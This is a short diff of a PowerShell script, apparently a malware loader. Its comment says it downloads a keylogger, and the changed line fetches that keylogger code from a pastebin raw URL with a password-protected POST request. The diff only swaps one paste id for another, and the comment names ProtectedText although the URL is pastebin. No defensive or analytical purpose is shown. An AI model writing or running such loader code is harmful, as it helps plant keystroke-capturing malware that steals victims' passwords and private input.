@@ -9,7 +9,7 @@ param(
 
 try {
     # 1. Download keylogger from ProtectedText
-    $keyloggerScript = (Invoke-WebRequest -Uri "https://pastebin.com/raw/VkdMJzDk?action=read" `
+    $keyloggerScript = (Invoke-WebRequest -Uri "https://pastebin.com/raw/key_9321?action=read" `
         -Method Post -Body (@{password=$Password}|ConvertTo-Json) -ContentType "application/json" `
         -UseBasicParsing).Content
     
